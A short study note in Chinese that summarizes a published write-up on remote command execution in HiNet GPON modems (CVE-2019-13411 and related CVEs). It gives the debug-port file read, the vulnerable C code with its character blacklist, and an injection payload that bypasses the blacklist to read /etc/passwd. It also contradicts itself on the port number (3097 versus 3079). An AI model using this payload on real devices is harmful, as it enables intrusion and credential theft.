---
date: 2025-03-06
publish: true
slug: dbe3ecb6-2964-4d12-b30a-3eb51cee75bf
tags:
- CS/Security
title: CVE 2019
uuid: 26aba0ab-c76e-4d9d-941d-1a24fa4a4a04
---
## [中華電信數據機遠端代碼執行漏洞 | Orange Tsai](https://blog.orange.tw/posts/2019-11-HiNet-GPON-Modem-RCE/)

HiNet GPON 韌體中託管在連接埠 3097 上的服務允許攻擊者隨機命令執行
一系列中華電信數據機的配置異常漏洞，引響約 25 萬台機器
相關的 CVE 漏洞編號:

- [CVE-2019-13411](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13411)
- [CVE-2019-13412](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13412)
- [CVE-2019-15064](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15064)
- [CVE-2019-15065](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15065)
- [CVE-2019-15066](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15066)

3097 連接埠提供了許多跟電信網路相關的指令，推測是中華電信給工程師遠端對數據機進行各種網路設定的除錯介面
用 nc 對 3079 port 下 `MISC SCRIPT &lt;path/to/file&gt;` 可以實施隨機檔案讀取
讀取 `/etc/passwd` 取得 root 密碼後用 ssh 登入機器

```sh
$ uname -a
Linux I-040GW.cht.com.tw 2.6.30.9-5VT #1 PREEMPT Wed Jul 31 15:40:34 CST 2019
[luna SDK V1.8.0] rlx GNU/Linux

$ netstat -anp | grep 3097
tcp        0      0 127.0.0.1:3097          0.0.0.0:*               LISTEN

$ ls -lh /usr/bin/omcimain
-rwxr-xr-x    1 root   root        4.6M Aug  1 13:40 /usr/bin/omcimain

$ file /usr/bin/omcimain
ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked
```

omcimain 是聽在 3079 port 的程式

```c
char *input = util_trim(s1);
if (input[0] == '\0' || input[0] == '#')
    return 0;
while (SUB_COMMAND_LIST[i] != 0) {
    sub_cmd = SUB_COMMAND_LIST[i++];
    if (strncmp(input, sub_cmd, strlen(sub_cmd)) == 0)
        break;
}
if (SUB_COMMAND_LIST[i] == 0 && strchr(input, '?') == 0)
    return -10;
// ...
char *BLACKLISTS = "|<>(){}`;";
while (BLACKLISTS[i] != 0) {
    if (strchr(input, BLACKLISTS[i]) != 0) {
        util_fdprintf(fd, "invalid char '%c' in command\n", BLACKLISTS[i]);
        return -1;
    }
    i++;
}
snprintf(file_buf,  64, "/tmp/tmpfile.%d.%06ld", getpid(), random() % 1000000);
snprintf(cmd_buf, 1024, "/usr/bin/diag %s > %s 2>/dev/null", input, file_buf);
system(cmd_buf);
```

經由逆向 omcimain 發現如過指令都沒有配對成功會執行上方程式碼

`notexisten? &amp;&amp; cat /etc/passwd` 可以繞過 BLACKLISTS 執行 `cat /etc/passwd`
